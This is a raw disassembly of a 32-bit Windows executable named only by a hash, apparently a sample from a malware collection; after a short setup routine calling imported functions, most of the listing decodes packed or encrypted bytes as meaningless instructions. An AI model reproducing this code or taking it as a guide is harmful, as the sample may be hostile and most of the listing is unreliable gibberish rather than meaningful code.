
6be054b3f8badd7ef0d9deb1666497ad513261b2834c161210a869676b1d9f42.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	call   0x8a1c3424
  401173:	lods   al,BYTE PTR ds:[esi]
  401174:	jmp    0x8137133b
  401179:	loop   0x4011d6
  40117b:	jge    0x401192
  40117d:	iret   
  40117e:	cmc    
  40117f:	(bad)  
  401180:	lock cdq 
  401182:	pushf  
  401183:	xchg   ecx,eax
  401184:	aaa    
  401185:	push   ebx
  401186:	(bad)  
  401187:	pop    ecx
  401188:	pop    esi
  401189:	inc    ebp
  40118a:	jae    0x401177
  40118c:	outs   dx,BYTE PTR ds:[esi]
  40118d:	test   DWORD PTR [eax],0xf642093d
  401193:	scas   eax,DWORD PTR es:[edi]
  401194:	pop    ecx
  401195:	repz xchg edi,eax
  401197:	add    esp,DWORD PTR [edx-0xf4d9745]
  40119d:	das    
  40119e:	mov    eax,0x6870456b
  4011a3:	mov    al,ds:0x6c608c8e
  4011a8:	jg     0x401139
  4011aa:	nop
  4011ab:	and    cl,BYTE PTR [ecx-0x10ae81d]
  4011b1:	sbb    bl,bl
  4011b3:	sti    
  4011b4:	xor    BYTE PTR [esi+edx*4],ch
  4011b7:	dec    esp
  4011b8:	aaa    
  4011b9:	das    
  4011ba:	mov    ?,WORD PTR [eax+esi*4]
  4011bd:	lahf   
  4011be:	cli    
  4011bf:	retf   0xf4b6
  4011c2:	cmp    edi,DWORD PTR [esi-0x17edffb5]
  4011c8:	imul   edi,DWORD PTR [ebx+0x6f7b5063],0x4622b849
  4011d2:	call   0xa89a4fda
  4011d7:	outs   dx,DWORD PTR ds:[esi]
  4011d8:	in     al,dx
  4011d9:	iret   
  4011da:	int    0x38
  4011dc:	cmp    esi,ebp
  4011de:	aad    0xc3
  4011e0:	je     0x4011d9
  4011e2:	add    eax,0x6dafdd48
  4011e7:	xor    BYTE PTR [edi-0x78],al
  4011ea:	test   DWORD PTR [eax],edx
  4011ec:	sub    bl,BYTE PTR [esi]
  4011ee:	add    ebx,edx
  4011f0:	or     al,0x11
  4011f2:	retf   0x51b3
  4011f5:	mov    BYTE PTR [esi+0x2c],al
  4011f8:	test   eax,edx
  4011fa:	or     al,0xb7
  4011fc:	jmp    0x7e49:0xa3f8f7e8
  401203:	or     eax,0x45d31b21
  401208:	out    0x4c,eax
  40120a:	outs   dx,DWORD PTR ds:[esi]
  40120b:	inc    ebp
  40120c:	inc    ecx
  40120d:	xor    BYTE PTR [edi],cl
  40120f:	hlt    
  401210:	xchg   esi,eax
  401211:	mov    edi,0xd0e78cdd
  401216:	xchg   edi,eax
  401217:	cs ja  0x401294
  40121a:	enter  0x9f73,0x5f
  40121e:	jb     0x401280
  401220:	mov    cl,0x2b
  401222:	push   eax
  401223:	cwde   
  401224:	or     BYTE PTR [ecx-0x44],bh
  401227:	sub    ah,ch
  401229:	mov    ds:0xd5c13050,al
  40122e:	scas   eax,DWORD PTR es:[edi]
  40122f:	adc    eax,0x23766e6e
  401234:	pop    ss
  401235:	retf   
  401236:	mov    cs,WORD PTR [ebx+0x124ca5a8]
  40123c:	mov    ecx,DWORD PTR [esi+0x37]
  40123f:	cs inc ebp
  401241:	pop    edi
  401242:	adc    DWORD PTR [edi+eax*1-0x3b4c6c33],eax
  401249:	cmp    BYTE PTR [edi-0x34],bh
  40124c:	jb     0x40120a
  40124e:	push   0x446789cb
  401253:	mov    edi,0x787c263
  401258:	pushf  
  401259:	jo     0x401215
  40125b:	addr16 out dx,al
  40125d:	scas   al,BYTE PTR es:[edi]
  40125e:	stc    
  40125f:	lods   eax,DWORD PTR ds:[esi]
  401260:	cmp    eax,0x4068f880
  401265:	sbb    BYTE PTR es:[edx-0x67c08b51],cl
  40126c:	mov    esi,0x819e6b72
  401271:	xchg   BYTE PTR [ebx+0x7f29f02b],al
  401277:	and    cl,cl
  401279:	rcr    edi,1
  40127b:	hlt    
  40127c:	ret    
  40127d:	shr    DWORD PTR [ecx+0x43],0xb9
  401281:	pop    esi
  401282:	ret    0x17aa
  401285:	icebp  
  401286:	adc    esp,DWORD PTR [edi+0x255a036f]
  40128c:	ret    
  40128d:	lods   al,BYTE PTR ds:[esi]
  40128e:	jne    0x4012b7
  401290:	sub    DWORD PTR [ebp+0xa19e44a],0x5e
  401297:	fs inc ebx
  401299:	aas    
  40129a:	mov    DWORD PTR [edi-0x1aa045d0],esi
  4012a0:	aam    0xa9
  4012a2:	stos   BYTE PTR es:[edi],al
  4012a3:	sub    eax,0x3a61ffc3
  4012a8:	rcr    DWORD PTR [ebx+0x54],1
  4012ab:	popa   
  4012ac:	xchg   edx,eax
  4012ad:	lahf   
  4012ae:	fmul   QWORD PTR [edi+0x49]
  4012b1:	mov    ds:0x805e2cff,eax
  4012b6:	in     al,0xf8
  4012b8:	mov    ebx,0x7052842f
  4012bd:	cmc    
  4012be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012bf:	xor    esp,DWORD PTR [edx-0x77]
  4012c2:	js     0x4012de
  4012c4:	sti    
  4012c5:	gs add eax,0x95a2dbda
  4012cb:	into   
  4012cc:	sub    bl,ch
  4012ce:	pusha  
  4012cf:	ins    WORD PTR es:[edi],dx
  4012d1:	loopne 0x401257
  4012d3:	and    DWORD PTR [eax-0x27896cb5],0xffffffdb
  4012da:	add    dh,bl
  4012dc:	pop    es
  4012dd:	adc    al,0xfa
  4012df:	mov    ah,ch
  4012e1:	cs daa 
  4012e3:	pop    ecx
  4012e4:	push   ds
  4012e5:	shr    DWORD PTR [ecx+esi*4],1
  4012e8:	mov    cl,0x6c
  4012ea:	or     BYTE PTR [ebp+0x31],ah
  4012ed:	jl     0x4012f7
  4012ef:	xchg   DWORD PTR [edi+0x16],ebp
  4012f2:	mul    BYTE PTR [ebx]
  4012f4:	jle    0x4012ba
  4012f6:	pop    ecx
  4012f7:	push   0xffffffaa
  4012f9:	sub    ecx,edx
  4012fb:	cmp    ah,al
  4012fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012fe:	pop    esp
  4012ff:	xor    DWORD PTR [ebp+0x4f],edi
  401302:	dec    ebp
  401303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401304:	(bad)  
  401305:	jo     0x40132d
  401307:	mov    eax,ds:0xed004232
  40130c:	mov    bl,0xb6
  40130e:	adc    DWORD PTR [eax+0x1e],ecx
  401311:	les    ebx,FWORD PTR [esi+eiz*4]
  401314:	sub    edi,DWORD PTR [esi]
  401316:	hlt    
  401317:	adc    BYTE PTR [ecx-0x56c09949],bl
  40131d:	loopne 0x40138b
  40131f:	push   esi
  401320:	xchg   edi,eax
  401321:	jge    0x401376
  401323:	and    dl,cl
  401325:	lods   al,BYTE PTR ds:[esi]
  401326:	mov    al,0x78
  401328:	xor    eax,0x99abc3a8
  40132d:	and    eax,0x92943dc0
  401332:	in     eax,0x5
  401334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401335:	push   ebp
  401336:	stc    
  401337:	fild   DWORD PTR [edx-0x6]
  40133a:	cmp    al,0xfa
  40133c:	pop    esi
  40133d:	push   ss
  40133e:	rcl    eax,cl
  401340:	mov    eax,0xc59f19ca
  401345:	nop
  401346:	jl     0x4012cd
  401348:	lods   eax,DWORD PTR ds:[esi]
  401349:	cmp    bh,ah
  40134b:	ret    0x36d4
  40134e:	xor    ch,BYTE PTR [esi]
  401350:	push   ecx
  401351:	dec    edx
  401352:	mov    esp,0xce78bd73
  401357:	(bad)  
  401359:	stc    
  40135a:	dec    edx
  40135b:	and    dl,BYTE PTR [edx]
  40135d:	(bad)  
  40135f:	aam    0x3f
  401361:	and    ch,dh
  401363:	ins    DWORD PTR es:[edi],dx
  401364:	or     cl,BYTE PTR [esp+ebp*8]
  401367:	fidivr WORD PTR [esp+edx*8+0x59]
  40136b:	std    
  40136c:	sar    ah,cl
  40136e:	xor    BYTE PTR [edx-0x5a],bh
  401371:	jbe    0xf46959b2
  401377:	ja     0x401334
  401379:	imul   edx,DWORD PTR [esi+eax*4+0xa0a2cc7],0xa16b742
  401384:	add    eax,0xcb2d84d2
  401389:	enter  0x9a6d,0x73
  40138d:	lea    esi,[ebp-0xccf2feb]
  401393:	retf   0x89a6
  401396:	shl    al,0x5b
  401399:	loope  0x401352
  40139b:	ss loopne 0x4013af
  40139e:	xchg   ecx,eax
  40139f:	xchg   edi,ebx
  4013a1:	push   ds
  4013a2:	mov    ecx,0xa4d2d762
  4013a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013a8:	pop    edx
  4013a9:	xor    ebp,DWORD PTR [eax+0x212d833d]
  4013af:	sub    al,0xdd
  4013b1:	xor    edx,0x3b
  4013b4:	jp     0x4013d0
  4013b6:	scas   al,BYTE PTR es:[edi]
  4013b7:	ret    0xfdf2
  4013ba:	mov    bl,0xb
  4013bc:	scas   al,BYTE PTR es:[edi]
  4013bd:	loop   0x40140e
  4013bf:	and    eax,0x52be17f0
  4013c4:	daa    
  4013c5:	sbb    eax,0x44666fee
  4013ca:	sub    dh,BYTE PTR [ebx+0x1b]
  4013cd:	sub    BYTE PTR [edx],bh
  4013cf:	jbe    0x401381
  4013d1:	inc    edi
  4013d2:	js     0x401436
  4013d4:	ds jne 0x401425
  4013d7:	or     bl,BYTE PTR [edi]
  4013d9:	sbb    ecx,ebp
  4013db:	into   
  4013dc:	mov    DWORD PTR [esp+ebx*4],edi
  4013df:	ret    
  4013e0:	aam    0x58
  4013e2:	pop    ds
  4013e3:	dec    ecx
  4013e4:	stos   DWORD PTR es:[edi],eax
  4013e5:	jbe    0x40141c
  4013e7:	lock rcr edi,1
  4013ea:	je     0x401407
  4013ec:	sbb    edx,0x4c
  4013ef:	aad    0xe3
  4013f1:	inc    esp
  4013f2:	int3   
  4013f3:	mov    cl,0xf4
  4013f5:	xor    bh,bh
  4013f7:	ins    DWORD PTR es:[edi],dx
  4013f8:	sub    bl,ah
  4013fa:	xor    BYTE PTR [edx-0x5079f382],cl
  401400:	push   edx
  401401:	adc    ah,BYTE PTR [eax-0x6f]
  401404:	inc    eax
  401405:	fbld   TBYTE PTR [edi+eiz*1+0x45dd1f3e]
  40140c:	adc    ebx,DWORD PTR [eax]
  40140e:	shl    ecx,cl
  401410:	mov    esp,0xd89df8b9
  401415:	(bad)  
  401416:	mov    esi,DWORD PTR [ecx+0x7ecd3a8f]
  40141c:	jo     0x4013ed
  40141e:	push   ebp
  40141f:	pop    ebx
  401420:	sub    cl,bh
  401422:	mov    esi,0x42b7aa0e
  401427:	jb     0x40142f
  401429:	inc    esi
  40142a:	cld    
  40142b:	enter  0xdd7f,0x2c
  40142f:	stos   DWORD PTR es:[edi],eax
  401430:	out    dx,al
  401431:	(bad)  [ebp-0x75194325]
  401437:	in     al,dx
  401438:	cmp    BYTE PTR [ebx-0x7c],cl
  40143b:	(bad)  
  40143c:	sti    
  40143d:	and    esi,edx
  40143f:	jmp    0x3869:0x972ecec
  401446:	aas    
  401447:	retf   
  401448:	imul   BYTE PTR [edx+0x6814fce3]
  40144e:	(bad)  
  40144f:	or     eax,0xe2aed6f7
  401454:	daa    
  401455:	inc    esi
  401456:	and    DWORD PTR [ebx-0x586ed8c],eax
  40145c:	ficomp DWORD PTR [eax]
  40145e:	jns    0x401499
  401460:	js     0x4014bd
  401462:	in     al,dx
  401463:	push   ds
  401464:	cli    
  401465:	or     ebp,DWORD PTR [ebx+0x49e631fa]
  40146b:	imul   DWORD PTR [edx+eax*1-0x5c1ed563]
  401472:	ror    ecx,1
  401474:	daa    
  401475:	in     eax,dx
  401476:	loope  0x4014a2
  401478:	add    al,0x6f
  40147a:	test   eax,0xf49f6069
  40147f:	sar    dl,1
  401481:	les    edx,FWORD PTR [esp+edx*2+0xf]
  401485:	(bad)  
  401486:	jae    0x4014a8
  401488:	dec    ah
  40148a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40148b:	pop    ecx
  40148c:	pop    ss
  40148d:	mov    ch,0xcc
  40148f:	sbb    DWORD PTR [edi-0x5d1a3d01],ebx
  401495:	sbb    al,0xf3
  401497:	scas   eax,DWORD PTR es:[edi]
  401498:	inc    edx
  401499:	mov    dl,0x5a
  40149b:	add    esp,DWORD PTR [esi+0x7d]
  40149e:	xchg   esp,eax
  40149f:	sub    BYTE PTR [ecx],cl
  4014a1:	ret    0xd59d
  4014a4:	dec    edi
  4014a5:	cld    
  4014a6:	push   edi
  4014a7:	pop    es
  4014a8:	mov    edi,0xbe842bb7
  4014ad:	sbb    al,0x96
  4014af:	mov    al,ds:0x5f51187d
  4014b4:	or     cl,BYTE PTR [ebx-0x5e]
  4014b7:	in     eax,0xb3
  4014b9:	(bad)  
  4014bb:	arpl   WORD PTR [esi-0x3f],dx
  4014be:	push   edx
  4014bf:	clc    
  4014c0:	xchg   BYTE PTR [eax-0x5be93fb9],al
  4014c6:	mov    edx,0x99d87c4
  4014cb:	jmp    0x4014f8
  4014cd:	xchg   edx,eax
  4014ce:	addr16 add eax,0x93caa620
  4014d4:	scas   eax,DWORD PTR es:[edi]
  4014d5:	xor    edx,0xffffffad
  4014d8:	ss aaa 
  4014da:	nop
  4014db:	rcr    BYTE PTR ds:0xbd0ab7b3,1
  4014e1:	xchg   edi,eax
  4014e2:	sub    bh,BYTE PTR [edx+ecx*4-0x74]
  4014e6:	(bad)  
  4014e7:	retf   0xec5c
  4014ea:	bound  ebx,QWORD PTR [esi-0x494ed0b2]
  4014f0:	dec    edx
  4014f1:	xor    BYTE PTR [ecx],dh
  4014f3:	retf   0xafca
  4014f6:	ss jbe 0x40154c
  4014f9:	jns    0x4014f8
  4014fb:	add    dh,BYTE PTR [eax-0x68398dfa]
  401501:	jmp    0x2b8b:0x744d588a
  401508:	and    al,0xc5
  40150a:	mov    dh,0xdd
  40150c:	jge    0x4014a0
  40150e:	add    eax,DWORD PTR [eax+0x70d15691]
  401514:	jbe    0x401566
  401516:	push   ebx
  401517:	mov    cl,0xe5
  401519:	inc    ebp
  40151a:	in     eax,dx
  40151b:	loop   0x401514
  40151d:	mov    dh,0x87
  40151f:	mov    ch,BYTE PTR [ebp-0x7]
  401522:	sbb    al,0x2a
  401524:	sub    BYTE PTR [ebx+0x6e],ah
  401527:	(bad)  
  401528:	cmp    al,BYTE PTR [edx-0x71d736ac]
  40152e:	cmp    al,0x7f
  401530:	sar    DWORD PTR [esi+0x47],1
  401533:	mov    ds:0xb07b5f1e,eax
  401538:	adc    bh,BYTE PTR [ebx-0x45]
  40153b:	sbb    al,0x67
  40153d:	push   ds
  40153e:	add    BYTE PTR [edi],dh
  401540:	ret    
  401541:	xor    edx,DWORD PTR [eax+0x31]
  401544:	scas   al,BYTE PTR es:[edi]
  401545:	mov    edi,0x4d0433be
  40154a:	shl    DWORD PTR [edx+0x526721d2],cl
  401550:	add    DWORD PTR [ebp+edi*2-0x6f],edi
  401554:	ror    DWORD PTR [eax+0x2b1678ed],1
  40155a:	mov    esp,0x19173497
  40155f:	in     al,0x3b
  401561:	xchg   edi,eax
  401562:	xchg   esp,eax
  401563:	(bad)
  401566:	and    DWORD PTR [eax],edx
  401568:	mov    dh,0x20
  40156a:	add    dl,BYTE PTR ds:0x1228352f
  401570:	sub    ch,al
  401572:	fnstenv [ebx-0x50123495]
  401578:	jns    0x401507
  40157a:	xor    ebx,DWORD PTR [esi+0x40e1f6f6]
  401580:	push   ecx
  401581:	in     eax,0x66
  401583:	imul   edi,DWORD PTR [edx-0x25],0xfffffffa
  401587:	aas    
  401588:	ror    dh,0x21
  40158b:	outs   dx,BYTE PTR ds:[esi]
  40158c:	lea    edx,[esi-0x60a363d0]
  401592:	ror    BYTE PTR [esi+eiz*8+0x6a],1
  401596:	cli    
  401597:	adc    DWORD PTR [ebp-0x6a],ebp
  40159a:	jle    0x401604
  40159c:	push   esp
  40159d:	ror    esi,1
  40159f:	mov    edx,0xdd5122a3
  4015a4:	adc    DWORD PTR [edi-0x23b9611],ebp
  4015aa:	call   0x956bb6aa
  4015af:	cmc    
  4015b0:	push   edx
  4015b1:	jne    0x401604
  4015b3:	push   0xffffffe2
  4015b5:	das    
  4015b6:	bound  ebp,QWORD PTR [edx-0x3592d011]
  4015bc:	sti    
  4015bd:	lahf   
  4015be:	int3   
  4015bf:	jnp    0x4015f8
  4015c1:	xchg   esp,eax
  4015c2:	out    0x9c,al
  4015c4:	aad    0xbd
  4015c6:	push   esi
  4015c7:	push   0x536414c9
  4015cc:	sbb    ecx,eax
  4015ce:	out    dx,eax
  4015cf:	jecxz  0x4015f5
  4015d1:	pop    ss
  4015d2:	mov    ch,0x52
  4015d4:	cmp    bh,ch
  4015d6:	test   DWORD PTR [ecx],edx
  4015d8:	repnz iret 
  4015da:	cmp    eax,0x2e6ad414
  4015df:	sahf   
  4015e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015e1:	(bad)  
  4015e2:	cmp    ah,BYTE PTR [edx]
  4015e4:	and    BYTE PTR [ecx+ebp*8+0x3c],dh
  4015e8:	(bad)  
  4015e9:	hlt    
  4015ea:	push   eax
  4015eb:	xchg   DWORD PTR [ebp-0x46483d8a],eax
  4015f1:	mov    DWORD PTR [edi+0x1d],esp
  4015f4:	in     al,0x4a
  4015f6:	mov    esi,0x9f6e4fa9
  4015fb:	push   ss
  4015fc:	ficomp DWORD PTR [esi]
  4015fe:	mov    bl,0x98
  401600:	fwait
  401601:	not    DWORD PTR [edi-0xe9f1956]
  401607:	mov    bh,0xa9
  401609:	sar    BYTE PTR [esi],1
  40160b:	xchg   ecx,eax
  40160c:	push   ebx
  40160d:	xor    DWORD PTR [ebx],0xb1ff8b95
  401613:	sub    cl,bl
  401615:	mov    bl,0xf7
  401617:	xor    al,0x1a
  401619:	mov    eax,ds:0x54f3268b
  40161e:	or     al,0x9d
  401620:	dec    ebp
  401621:	and    DWORD PTR [ebp+0x22],0xffffffc9
  401625:	enter  0x19a3,0xd7
  401629:	and    eax,0x2dcef7ba
  40162e:	mov    ds:0x1cf71f64,eax
  401633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401634:	xor    edi,DWORD PTR [eax+0x22]
  401637:	mov    edx,DWORD PTR [eax+0x42]
  40163a:	sub    BYTE PTR [edi+ebx*8-0x49051a28],dh
  401641:	dec    esi
  401642:	lds    ebp,FWORD PTR [ebx+0x2c2698a0]
  401648:	dec    ebx
  401649:	pop    es
  40164a:	loope  0x4016ab
  40164c:	inc    ecx
  40164d:	mov    ds:0xfd957daf,eax
  401652:	push   edx
  401653:	mov    esi,0xb6abdded
  401658:	and    edx,DWORD PTR [ecx-0x1c]
  40165b:	pop    es
  40165c:	mov    cl,0xe9
  40165e:	push   0x94c8b62f
  401663:	jae    0x40163d
  401665:	xor    al,0xc1
  401667:	jmp    0xc6ee2637
  40166c:	scas   al,BYTE PTR es:[edi]
  40166d:	lock les edx,FWORD PTR [edx]
  401670:	test   BYTE PTR [edx],bh
  401672:	ror    ebp,cl
  401674:	fs inc eax
  401676:	jg     0x401601
  401678:	xchg   edx,eax
  401679:	test   al,bl
  40167b:	mov    WORD PTR [edi],es
  40167d:	popf   
  40167e:	push   esp
  40167f:	fstp   QWORD PTR ds:0x9699a714
  401685:	fild   DWORD PTR [ebp+0x16]
  401688:	jmp    0x4016f7
  40168a:	in     al,0x66
  40168c:	inc    edi
  40168d:	mov    dl,0x9f
  40168f:	fst    DWORD PTR [ebx+0x77fefdf7]
  401695:	mov    esp,0x1f1c0d63
  40169a:	add    dl,ch
  40169c:	jl     0x4016c3
  40169e:	inc    ebp
  4016a0:	cmp    al,dh
  4016a2:	sub    bl,BYTE PTR [edi-0x34]
  4016a5:	sahf   
  4016a6:	jp     0x4016e3
  4016a8:	in     eax,dx
  4016a9:	dec    eax
  4016aa:	adc    ebx,DWORD PTR [esi]
  4016ac:	mov    ebp,0x35eb364b
  4016b1:	or     DWORD PTR [eax-0x26a49d7a],ebp
  4016b7:	cdq    
  4016b8:	sub    DWORD PTR [ebx],0x3d6cb76b
  4016be:	(bad)  
  4016bf:	stc    
  4016c0:	loopne 0x4016f3
  4016c2:	repnz and DWORD PTR [esi],ebx
  4016c5:	pop    es
  4016c6:	or     al,0x80
  4016c8:	adc    al,0x9d
  4016ca:	inc    ah
  4016cc:	leave  
  4016cd:	fisubr DWORD PTR [edi]
  4016cf:	imul   eax,DWORD PTR [ebx+0x37],0x317d1dde
  4016d6:	ror    DWORD PTR [ecx+eiz*1],0xed
  4016da:	add    ch,BYTE PTR [edx+0x20]
  4016dd:	ds or  al,0x33
  4016e0:	xchg   ecx,esp
  4016e2:	out    dx,eax
  4016e3:	mov    ebp,ebp
  4016e5:	bound  ebp,QWORD PTR [eax+ecx*1]
  4016e8:	icebp  
  4016e9:	bound  esi,QWORD PTR [edx-0x3588e753]
  4016ef:	dec    edx
  4016f0:	test   al,0xcf
  4016f2:	out    0x7b,eax
  4016f4:	dec    eax
  4016f5:	test   eax,0xb27b74fc
  4016fa:	jge    0x401735
  4016fc:	cmp    eax,0x8dca5368
  401701:	pop    ebx
  401702:	push   ecx
  401703:	daa    
  401704:	mov    ebx,0x5045a0a1
  401709:	cld    
  40170a:	out    dx,eax
  40170b:	mov    bl,0xe
  40170d:	xchg   DWORD PTR [edi-0x39c9bdb3],ecx
  401713:	cmp    BYTE PTR [ebx+edx*2],dl
  401716:	sub    ch,BYTE PTR [ebx-0x4a]
  401719:	sub    BYTE PTR [edi+0x2a],0x8a
  40171d:	push   esi
  40171e:	popa   
  40171f:	repnz mov ds:0x3ce61b7d,eax
  401725:	push   ss
  401726:	inc    esp
  401727:	das    
  401728:	xor    eax,DWORD PTR [ebp-0x6295a19]
  40172e:	jb     0x4016df
  401730:	xchg   ebx,eax
  401731:	ror    BYTE PTR [eax],1
  401733:	(bad)  
  401734:	cwde   
  401735:	sbb    DWORD PTR [ecx],ecx
  401737:	pushf  
  401738:	stos   BYTE PTR es:[edi],al
  401739:	inc    eax
  40173a:	test   eax,0xd0ee8982
  40173f:	pop    es
  401740:	inc    eax
  401741:	pop    ecx
  401742:	pop    ds
  401743:	adc    eax,0x810bd86c
  401748:	adc    eax,0xf064a1dc
  40174d:	icebp  
  40174e:	add    BYTE PTR [eax+ecx*4+0x4c8bcb34],al
  401755:	cmp    al,BYTE PTR [esi]
  401757:	add    eax,0xf1fa2b0
  40175c:	das    
  40175d:	jne    0x401715
  40175f:	fstp   DWORD PTR ds:0xdeaec568
  401765:	(bad)  
  401766:	repz pop edx
  401768:	int3   
  401769:	int    0x78
  40176b:	leave  
  40176c:	out    0x74,eax
  40176e:	nop
  40176f:	adc    al,0x21
  401771:	clc    
  401772:	pop    ss
  401773:	cmp    esi,edi
  401775:	push   ebx
  401776:	push   edi
  401777:	dec    ecx
  401778:	add    DWORD PTR [ecx],ecx
  40177a:	jae    0x401758
  40177c:	inc    edi
  40177d:	lods   eax,DWORD PTR ds:[esi]
  40177e:	jo     0x4017a7
  401780:	(bad)  
  401781:	mov    edi,0xf78ab07b
  401786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401787:	dec    eax
  401788:	sbb    al,0xe1
  40178a:	pop    edx
  40178b:	je     0x4017ba
  40178d:	xor    esi,esi
  40178f:	aas    
  401790:	arpl   di,di
  401792:	arpl   cx,bp
  401794:	pop    edi
  401795:	shl    DWORD PTR [ebx+0x2a64997e],cl
  40179b:	in     eax,0xa4
  40179d:	stos   BYTE PTR es:[edi],al
  40179e:	inc    ecx
  40179f:	shr    dl,1
  4017a1:	push   es
  4017a2:	jecxz  0x4017db
  4017a4:	or     DWORD PTR [eax+0x78],0x21
  4017a8:	mov    eax,ds:0x59dda84e
  4017ad:	add    al,0x37
  4017af:	leave  
  4017b0:	mov    ecx,0x9604be3b
  4017b5:	sub    al,0x6e
  4017b7:	add    al,0x9
  4017b9:	clc    
  4017ba:	mov    esi,0x58c623ce
  4017bf:	and    DWORD PTR [edx+0x44],esi
  4017c2:	sbb    ebx,DWORD PTR [edx+0x43fbc1db]
  4017c8:	dec    ecx
  4017c9:	inc    ebp
  4017ca:	jno    0x401804
  4017cc:	push   ebx
  4017cd:	pop    ebp
  4017ce:	push   ds
  4017cf:	xchg   BYTE PTR [esi-0x6539cc14],bh
  4017d5:	dec    ebx
  4017d6:	jle    0x401822
  4017d8:	mov    esp,ebp
  4017da:	mov    ebx,DWORD PTR [ebp+ecx*1+0x5e]
  4017de:	xchg   ecx,eax
  4017df:	push   0x79
  4017e1:	sbb    al,BYTE PTR [esi-0x3a]
  4017e4:	push   ds
  4017e5:	push   ebp
  4017e6:	mov    ds:0x60b8387b,al
  4017eb:	(bad)  
  4017ec:	sbb    edx,DWORD PTR [ebx-0x2e1c7e72]
  4017f2:	adc    ah,BYTE PTR [esi+0x994d1f7]
  4017f8:	fcom   DWORD PTR [eax]
  4017fa:	inc    ecx
  4017fb:	loope  0x4017a6
  4017fd:	mov    ebx,0xc1c181fd
  401802:	(bad)  
  401803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401804:	push   0xffffffdc
  401806:	enter  0x7bb3,0x72
  40180a:	adc    BYTE PTR [edi-0x69355fcc],al
  401810:	or     eax,0xa5cfe1b9
  401815:	lods   al,BYTE PTR ds:[esi]
  401816:	jbe    0x401807
  401818:	push   edi
  401819:	add    ah,bl
  40181b:	stos   BYTE PTR es:[edi],al
  40181c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40181d:	add    dh,BYTE PTR [ebp+0x3894a911]
  401823:	xchg   esp,eax
  401824:	in     al,0x3f
  401826:	xor    DWORD PTR [ebp+0x3a],edx
  401829:	mov    ds,WORD PTR [ebp-0x348e26fe]
  40182f:	rcr    BYTE PTR [ebx-0x6fbce33d],1
  401835:	mov    ebx,0xfa354c0
